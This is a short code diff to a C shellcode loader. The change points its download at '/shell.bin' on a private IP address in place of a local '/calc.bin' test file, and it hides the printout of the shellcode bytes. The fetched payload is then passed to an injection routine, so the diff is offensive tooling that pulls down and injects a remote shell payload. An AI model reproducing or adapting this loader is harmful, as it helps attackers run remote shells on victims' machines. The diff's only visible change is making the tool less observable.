@@ -11,20 +11,20 @@ int main()
 
 	unsigned char* pPayload = NULL;
 	
-	PSTR url = "127.0.0.1";
-	PSTR endpoint = "/calc.bin";
+	PSTR url = "192.168.231.130";
+	PSTR endpoint = "/shell.bin";
 	
 	SIZE_T sSize = Download(&pPayload, url, endpoint, FALSE);
 
 	if (sSize == -1)
 		goto _Cleanup;
 	//Printing shellcode
-	printf("[*] Shellcode: \n");
+	/*printf("[*] Shellcode: \n");
 	for (SIZE_T i = 0; i < sSize; i++)
 	{
 		printf("%02X ", pPayload[i]);
 	}
-	printf("\n");
+	printf("\n");*/
 
 	if (InitiateInjection(pPayload,sSize))
 	{
